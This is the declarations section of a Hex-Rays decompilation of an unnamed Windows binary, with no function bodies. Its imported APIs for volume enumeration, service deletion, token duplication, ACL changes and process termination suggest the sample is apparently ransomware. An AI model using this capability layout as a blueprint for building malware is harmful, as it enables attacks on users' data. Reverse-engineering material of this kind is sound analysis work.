/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

LPWSTR *sub_401000();
// int __usercall sub_4010D0@<eax>(int a1@<edx>, _BYTE *a2@<ecx>, int a3);
void *sub_4011F0();
int __cdecl sub_401200(int *a1, int a2, int a3);
int __cdecl sub_401240(int *a1, int a2, int a3);
int __cdecl sub_401280(int a1, int a2, int a3);
int *sub_401380();
char __thiscall sub_401550(_BYTE *this);
int __cdecl sub_4016B0(int, LPVOID lpOptional, DWORD dwOptionalLength); // idb
// BOOL __usercall sub_401760@<eax>(void *a1@<ebp>);
unsigned int __fastcall sub_401A80(int a1, int *a2);
// int __usercall sub_401F30@<eax>(unsigned __int8 *a1@<edx>, _DWORD *a2@<ecx>, unsigned __int8 *a3);
// void __usercall sub_402100(__m128i *a1@<edx>, __m128i *a2@<ecx>, __m128i *a3, unsigned int a4);
// __int64 __usercall sub_402690@<edx:eax>(int a1@<edx>, int _ECX@<ecx>, int a3@<ebp>, int a4);
// __m128i *__usercall sub_403260@<eax>(__m128i *a1@<edx>, __m128i *a2@<ecx>, __m128i *a3);
void *sub_403BC0();
void *__cdecl sub_403BD0(size_t Size);
void __cdecl j__free(void *Block);
void *__cdecl sub_403BF0(void *Block, size_t Size);
void __thiscall sub_403C00(_DWORD *this);
int __thiscall sub_403C80(_BYTE *this);
// char __usercall sub_403CE0@<al>(int a1@<edx>, _BYTE *a2@<ecx>, _DWORD *a3);
int __fastcall sub_403E20(int a1, int *a2);
// _DWORD *__userpurge sub_404040@<eax>(unsigned int a1@<edx>, char *a2@<ecx>, double a3@<st0>, int a4, int a5);
// int __usercall sub_404130@<eax>(int *a1@<edx>, int a2@<ecx>, double a3@<st0>);
int __fastcall sub_404380(int a1, int *a2);
int __fastcall sub_404510(int a1, int a2);
_DWORD *__fastcall sub_404720(int a1, unsigned __int8 *a2);
// void __usercall sub_4047E0(unsigned int a1@<edx>, char *a2@<ecx>, double a3@<st0>);
LPCSTR sub_4052D0();
// BOOL __usercall sub_405380@<eax>(double a1@<st0>);
int __thiscall sub_405450(unsigned __int8 *this);
// __int64 __usercall sub_405510@<edx:eax>(int *a1@<edx>, _QWORD *a2@<ecx>, int *a3);
__int64 __thiscall sub_4059E0(_QWORD *this);
int __thiscall sub_405AC0(_DWORD *this);
__int64 __fastcall sub_405BD0(int a1, int *a2);
int *__fastcall sub_405F50(int *a1, unsigned __int8 *a2);
int __fastcall sub_406250(int a1, int *a2);
// int __usercall sub_4067E0@<eax>(_QWORD *a1@<edx>, _QWORD *a2@<ecx>, __m128i *a3, int a4, int a5, __m128i *a6, int a7, __m128i *a8, int *a9);
// __int64 __usercall sub_406F80@<edx:eax>(_DWORD *a1@<edx>, _DWORD *a2@<ecx>, int a3);
// __m128i *__usercall sub_4070D0@<eax>(int a1@<edx>, _OWORD *a2@<ecx>, int a3, int a4);
int __fastcall sub_407390(_OWORD *a1, int *a2);
// int __usercall sub_4087B0@<eax>(__m128i *a1@<edx>, int a2@<ecx>, unsigned __int8 *a3);
void sub_4088A0();
void __cdecl sub_408990(int a1, int a2);
void sub_408AA0();
void sub_408AE0();
BOOL sub_408B30();
HINSTANCE sub_408B60();
HINSTANCE sub_408BD0();
BOOL sub_408BF0();
__int16 __thiscall sub_408C10(char *this);
void sub_408E20();
void sub_409090();
void sub_409300();
HINSTANCE sub_409420();
HINSTANCE sub_409450();
SHUTDOWN_ACTION sub_409500();
void sub_409540();
void sub_4096B0();
void sub_409A50();
void __thiscall sub_409B80(HKEY this);
int __thiscall sub_409C20(LPCWSTR lpServiceName); // idb
void sub_409EF0();
void sub_40A020();
char __fastcall sub_40A060(UCHAR *a1, ULONG a2);
char __thiscall sub_40A1B0(const WCHAR *this);
void sub_40A330();
char __thiscall sub_40A560(LPCWSTR lpString1);
BOOL __thiscall sub_40A5E0(LPCWSTR lpString);
char __thiscall sub_40A6B0(const WCHAR *this);
char __fastcall sub_40A8B0(const WCHAR *pObjectName, const void *a2);
ULONG __stdcall StartAddress(const WCHAR *Parameter);
BOOL sub_40B460();
ULONG __stdcall sub_40B950(PVOID Parameter); // idb
// HANDLE __usercall sub_40BC60@<eax>(int a1@<ebp>, int a2@<edi>);
char sub_40C060();
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void sub_40C330();
int __cdecl sub_40C360(int *a1, int a2, int a3, int a4);
_DWORD *__thiscall sub_40C3A0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40C3D0(_DWORD *Block, char a2);
int sub_40C400();
__int64 __thiscall sub_40C410(_DWORD *this, _DWORD *a2);
int __thiscall sub_40C430(_DWORD *this, unsigned int *a2, void *Dst, int a4, size_t *a5);
_DWORD *__thiscall sub_40C4A0(_DWORD *this, __int64 a2);
_DWORD *__thiscall sub_40C6E0(_DWORD *Block, char a2);
int __thiscall sub_40C730(int this, __int64 a2, unsigned int a3, char *lpBuffer, DWORD NumberOfBytesRead, _DWORD *a6);
int __thiscall sub_40C900(_DWORD *this);
__int64 __thiscall sub_40C910(_DWORD *this, _DWORD *a2);
int __thiscall sub_40C940(_DWORD *this, _DWORD *a2, char *Dst, int a4, _DWORD *a5);
_DWORD *__thiscall sub_40CB10(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40CB40(_DWORD *Block, char a2);
int __thiscall sub_40CB80(_DWORD *this);
_DWORD *__thiscall sub_40CC70(_DWORD *Block, char a2);
void *__thiscall sub_40CCC0(void *Block, char a2);
_DWORD *__thiscall sub_40CD10(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40CD70(_DWORD *Block, char a2);
char *__thiscall sub_40CDC0(char *Block, char a2);
_DWORD *__thiscall sub_40CE00(_DWORD *Block, char a2);
int __thiscall sub_40CE50(int this, _QWORD *a2, _DWORD *a3);
char *__thiscall sub_40D030(char *this, int a2);
_DWORD *__thiscall sub_40D0C0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40D140(int *this, unsigned int a2, _DWORD *a3);
int __thiscall sub_40D920(_DWORD *this, unsigned __int64 a2);
int __thiscall sub_40DB20(int *this);
char *__thiscall sub_40DC70(char *this, DWORD NumberOfBytesRead);
_DWORD *__thiscall sub_40E070(_DWORD *Block, char a2);
int __fastcall sub_40E0B0(int a1, int a2);
void *__fastcall sub_40E330(_DWORD *a1, int *a2);
// _DWORD *__usercall sub_40E6C0@<eax>(int a1@<edx>, int a2@<ecx>, __int64 a3);
BOOL __cdecl sub_40E7D0(char *lpMem);
_DWORD *__thiscall sub_40E910(_DWORD *this);
_DWORD *__thiscall sub_40E970(_DWORD *this);
int __thiscall sub_40E9D0(int this);
_DWORD *__thiscall sub_40EA30(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40EA60(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40EA90(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40EAC0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40EAF0(_DWORD *this, __int64 a2);
int __thiscall sub_40ED10(_DWORD *this, int a2, int *a3);
_DWORD *__thiscall sub_40EF70(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40EFD0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40F010(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40F080(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40F0BC(_DWORD *this, char a2);
char *__thiscall sub_40F0C4(char *this, char a2);
ULONG __stdcall sub_40F0D0(PVOID Parameter); // idb
ULONG __stdcall sub_40F100(PVOID Parameter); // idb
ULONG __stdcall sub_40F520(PVOID Parameter); // idb
ULONG sub_40F700();
int __stdcall sub_40F930();
PACL __thiscall sub_40FB80(LPWSTR pObjectName);
void sub_40FC50();
ULONG sub_40FE30();
int __fastcall sub_40FEE0(_DWORD *a1, int a2);
// void __usercall sub_4101D0(char *a1@<edx>, _DWORD *a2@<ecx>, unsigned int a3);
void __fastcall sub_410250(char *a1, _BYTE *a2);
void __cdecl j_j__free(void *Block);
// void *__cdecl operator new(size_t Size); idb
void __cdecl sub_410463(void *Block);
// int __cdecl unknown_libname_1(_DWORD); weak
_DWORD *__thiscall sub_41047A(_DWORD *Block, char a2);
int sub_410548();
int sub_410550();
std::exception *__thiscall sub_4106E8(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_410703(_DWORD *this);
std::exception *__thiscall sub_41071B(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_410736(_DWORD *this);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); idb
void __noreturn sub_4107B8(); // weak
void __noreturn sub_4107D5(); // weak
int __cdecl UserMathErrorFunction();
int sub_410AEB();
void sub_410AF5();
char sub_410B01();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_410B45();
void *sub_410B51();
void *sub_410B57();
LPTOP_LEVEL_EXCEPTION_FILTER sub_410CF1();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_410D53();
void sub_410D5B();
void __cdecl sub_410D87(); // idb
// wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch);
int sub_4111B6();
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// void *__cdecl memset(void *Dst, int Val, size_t Size);
// int __usercall sub_411CC0@<eax>(int (*a1)(void)@<eax>);
// void *__cdecl memmove(void *Dst, const void *Src, size_t MaxCount);
// char *__cdecl _ui64toa(unsigned __int64 Value, char *Buffer, int Radix);
int __cdecl sub_412549(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
int __cdecl sub_4126C7(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<wchar_t>(_DWORD); weak
// _DWORD __cdecl __crt_stdio_output::is_wide_character_specifier<wchar_t>(_DWORD, _DWORD, __int16, _DWORD); weak
// _DWORD __stdcall unknown_libname_4(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_5(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_6(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __stdcall sub_412B9F(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(_DWORD, char, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_7(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); idb
// _DWORD __stdcall unknown_libname_10(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_12(_DWORD); weak
// _DWORD __stdcall sub_413039(_DWORD); weak
int __thiscall sub_4130AF(int this);
int __thiscall sub_4131C3(int this);
// int __thiscall unknown_libname_13(_DWORD); weak
// int __thiscall unknown_libname_14(_DWORD); weak
char __thiscall sub_413359(char *this);
char sub_413378();
char __thiscall sub_413397(char *this);
// int unknown_libname_15(void); weak
// _DWORD __stdcall unknown_libname_16(_DWORD); weak
// int __thiscall sub_413440(_DWORD); weak
char __thiscall sub_413466(int this);
char __thiscall sub_41348D(_BYTE *this);
char __thiscall sub_4135DB(_DWORD *this);
char __thiscall sub_413753(int this);
char __thiscall sub_413985(int this);
char __thiscall sub_413BE2(int this);
char __thiscall sub_413C0D(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_17(_DWORD); weak
// int __fastcall unknown_libname_18(_DWORD, _DWORD); weak
// int __thiscall unknown_libname_19(_DWORD); weak
// int __fastcall sub_413EA1(_DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_20(_DWORD); weak
// _DWORD __stdcall unknown_libname_21(_DWORD); weak
char __thiscall sub_414131(int this, int a2, char a3);
char __thiscall sub_414282(int this, int a2, char a3);
// int __thiscall unknown_libname_22(_DWORD); weak
char __thiscall sub_41444B(_DWORD *this);
char __thiscall sub_41446A(_DWORD *this);
char __thiscall sub_414489(_DWORD *this);
char __thiscall sub_4144A1(_DWORD *this);
// int __thiscall unknown_libname_23(_DWORD); weak
char __thiscall sub_41452A(_DWORD *this);
// _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD); weak
// int __thiscall unknown_libname_25(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_26(_DWORD); weak
// _DWORD __stdcall unknown_libname_27(_DWORD); weak
// int __stdcall unknown_libname_28(void *Src, int, int, int); idb
// int __stdcall unknown_libname_29(void *Src, int, int, int); idb
int __cdecl sub_4148B2(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7);
int __cdecl sub_4148D6(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7);
double __cdecl sub_41498D(int a1, _DWORD *a2, struct __crt_locale_pointers *a3);
// _DWORD __cdecl unknown_libname_30(_DWORD, _DWORD, _DWORD); weak
// int __cdecl __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(_locale_t Locale, int, int, int); idb
void __cdecl sub_417B5B(int, _DWORD *);
// void *__cdecl realloc(void *Block, size_t Size);
// int __cdecl tolower(int C);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// void *__cdecl malloc(size_t Size);
// wchar_t *__cdecl wcsncpy(wchar_t *Dest, const wchar_t *Source, size_t Count);
// int __cdecl iswalpha(wint_t C);
// wint_t __cdecl towupper(wint_t C);
int __cdecl sub_417EAA(int a1);
int sub_41809A();
int __cdecl sub_4180A0(int a1);
int __cdecl sub_4180E6(int a1);
// int __cdecl unknown_libname_32(void *Block); idb
void *__cdecl sub_41860C(void **a1);
void *__cdecl sub_418627(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_41896E(int a1);
__int32 sub_418A98();
int sub_418B2C();
// int __cdecl _set_new_mode(int NewMode);
void *sub_418B62();
int __stdcall sub_418B68(_DWORD *a1, int a2, _DWORD *a3);
int __stdcall sub_418BC3(_DWORD *a1, int a2, _DWORD *a3);
// int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD); weak
// int __thiscall _lambda_f03950bc5685219e0bcd2087efbe011e_::operator()(_DWORD); weak
int __cdecl sub_418E21(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_418EC0();
char sub_418EE7();
__vcrt_bool sub_418F1D();
int __cdecl sub_419B10(int a1);
// void __cdecl _invalid_parameter_noinfo();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// size_t __cdecl wcsnlen(const wchar_t *Src, size_t MaxCount);
// int __acrt_getptd(void); weak
struct __crt_locale_data *__cdecl sub_41A848(int a1, struct __crt_locale_data **a2);
struct __crt_multibyte_data *__cdecl sub_41A875(int a1, struct __crt_multibyte_data **a2);
// int __cdecl __acrt_fp_classify(_DWORD); weak
// int __cdecl fp_format_a(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl fp_format_e(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl fp_format_f(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl fp_format_g(const double *const, char *const Src, unsigned int, char *const, unsigned int, size_t Size, bool, unsigned int, struct __crt_locale_pointers *const); idb
// int __cdecl fp_format_nan_or_infinity(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41B255(double *a1, char *Src, unsigned int a3, char *a4, unsigned int a5, int a6, size_t Size, char a8, int a9, int a10, struct __crt_locale_pointers *a11);
// int __cdecl fegetround();
// _DWORD __cdecl __acrt_lock(_DWORD); weak
// _DWORD __cdecl __acrt_unlock(_DWORD); weak
// struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(struct __acrt_ptd *const, struct __crt_multibyte_data **const); idb
struct __crt_multibyte_data *sub_41C831();
// int __acrt_update_thread_locale_data(void); weak
int sub_41D64E();
int sub_41D668();
// int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_41D956(wchar_t *, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest, int, int, int); // idb
// int __stdcall __acrt_LocaleNameToLCID(wchar_t *, int); idb
char sub_41DAC3();
// int __cdecl common_flush_all(bool); idb
int sub_41E0F6();
bool __cdecl sub_41E854(char *a1, int a2, int a3, int a4);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_422B58(int a1);
// void __cdecl __dcrt_lowio_initialize_console_output(); idb
BOOL sub_422D40();
// int __usercall sub_423CF0@<eax>(double _ST7@<st0>);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_410051; // weak
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// extern DWORD (__stdcall *SetEntriesInAclW)(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl);
// extern DWORD (__stdcall *SetNamedSecurityInfoW)(LPWSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern PVOID (__stdcall *FreeSid)(PSID pSid);
// extern BOOL (__stdcall *DuplicateToken)(HANDLE ExistingTokenHandle, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, PHANDLE DuplicateTokenHandle);
// extern BOOL (__stdcall *SetThreadToken)(PHANDLE Thread, HANDLE Token);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern SC_HANDLE (__stdcall *OpenSCManagerW)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern LSTATUS (__stdcall *RegCreateKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern BOOL (__stdcall *DeleteService)(SC_HANDLE hService);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *EnumDependentServicesW)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSW lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern SC_HANDLE (__stdcall *OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetUserNameW)(LPWSTR lpBuffer, LPDWORD pcbBuffer);
// extern COLORREF (__stdcall *SetBkColor)(HDC hdc, COLORREF color);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern HFONT (__stdcall *CreateFontW)(int cHeight, int cWidth, int cEscapement, int cOrientation, int cWeight, DWORD bItalic, DWORD bUnderline, DWORD bStrikeOut, DWORD iCharSet, DWORD iOutPrecision, DWORD iClipPrecision, DWORD iQuality, DWORD iPitchAndFamily, LPCWSTR pszFaceName);
// extern int (__stdcall *GetDIBits)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// extern int (__stdcall *GetDeviceCaps)(HDC hdc, int index);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern BOOL (__stdcall *GetTextExtentPoint32W)(HDC hdc, LPCWSTR lpString, int c, LPSIZE psizl);
// extern COLORREF (__stdcall *SetTextColor)(HDC hdc, COLORREF color);
// extern int (__stdcall *SetBkMode)(HDC hdc, int mode);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern ULONG (__stdcall *GetAdaptersInfo)(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName);
// extern void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern DWORD (__stdcall *GetTickCount)();
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern BOOL (__stdcall *GetQueuedCompletionStatus)(HANDLE CompletionPort, LPDWORD lpNumberOfBytesTransferred, PULONG_PTR lpCompletionKey, LPOVERLAPPED *lpOverlapped, DWORD dwMilliseconds);
// extern DWORD (__stdcall *ResumeThread)(HANDLE hThread);
// extern BOOL (__stdcall *PostQueuedCompletionStatus)(HANDLE CompletionPort, DWORD dwNumberOfBytesTransferred, ULONG_PTR dwCompletionKey, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern EXECUTION_STATE (__stdcall *SetThreadExecutionState)(EXECUTION_STATE esFlags);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern HANDLE (__stdcall *CreateIoCompletionPort)(HANDLE FileHandle, HANDLE ExistingCompletionPort, ULONG_PTR CompletionKey, DWORD NumberOfConcurrentThreads);
// extern HANDLE (__stdcall *HeapCreate)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern HANDLE (__stdcall *CreateSemaphoreW)(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCWSTR lpName);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
// extern BOOL (__stdcall *RemoveDirectoryW)(LPCWSTR lpPathName);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *SetPriorityClass)(HANDLE hProcess, DWORD dwPriorityClass);
// extern HANDLE (__stdcall *FindFirstFileExW)(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
